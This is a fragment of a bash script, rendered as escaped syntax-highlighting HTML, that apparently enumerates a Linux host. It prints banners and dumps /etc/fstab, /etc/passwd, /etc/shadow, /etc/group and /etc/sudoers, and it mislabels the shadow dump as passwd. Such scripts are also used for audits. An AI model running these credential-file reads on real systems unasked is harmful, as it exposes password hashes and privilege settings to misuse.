&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; /etc/fstab File Contents&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/bin/cat /etc/fstab


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; /etc/passwd File Contents&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/bin/cat /etc/passwd


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; /etc/passwd File Contents&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/bin/cat /etc/shadow

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; /etc/group File Contents&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/bin/cat /etc/group


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; /etc/sudoers File Contents&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/bin/cat /etc/sudoers


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Sticky Bit Files&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
